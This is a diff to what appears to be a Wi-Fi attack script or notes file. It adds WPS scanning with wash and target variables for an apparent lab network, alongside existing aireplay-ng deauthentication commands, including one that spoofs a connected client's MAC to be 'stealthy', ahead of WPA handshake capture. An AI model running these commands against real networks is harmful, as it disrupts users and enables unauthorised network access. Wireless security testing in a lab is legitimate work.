@@ -21,7 +21,7 @@ wlan_device="wlan1"
 #note that certain devices may name themselves as wlanXmon depending on situation
 
 
-#====WIFI SCANNING====
+#====WIFI WPA/WPS SCANNING/CAPTURE PREPARATION====
 
 #ACTIVATE WLAN_DEVICE IN MONITORING MODE
 airmon-ng start $wlan_device
@@ -33,6 +33,8 @@ airmon-ng start $wlan_device
 #TO RESTART (PROBABLE) KILLED NETWORK SERVICES
 sudo systemctl start wpa_supplicant.service
 sudo systemctl start NetworkManager.service
+
+#====WIFI WPA SCANNING PROPER====
 
 #SCAN NETWORK AND DUMP INTO .CSV FILE
 sample_tempfilename = "2022-10-29-17-08-00" #name format = yyyy-mm-dd-hh-mm-ss.csv
@@ -101,6 +103,20 @@ aireplay-ng -0 0 -a $target_bssid $wlan_logical #NOISY
 #You'd wanna use someone else's or your other device's 
 #MAC address who's able to connect already.
 aireplay-ng -0 0 -a $target_bssid -c $host_mac $wlan_logical #KINDA STEALTHY
+
+
+#====WIFI WPS SCANNING PROPER====
+#The ff variables must be also available on actual python script
+target_essid = "LAB_NETWORK"
+target_bssid = "AC:84:C6:94:DA:08"
+target_channel = "6" #to parse as int when needed but used as str most of the time
+wlan_mac = "F4:28:53:14:88:3B" #mac address of wlan_device
+wlan_logical = "wlan1"
+host_mac = "A4:FF:12:14:90:B3"
+
+
+#START SCAN USING WASH TO JSON FORMAT (CAN BE USED TO PIPE)
+sudo wash -i $wlan_logical --json
 
 
 #====HANDSHAKE CAPTURE====
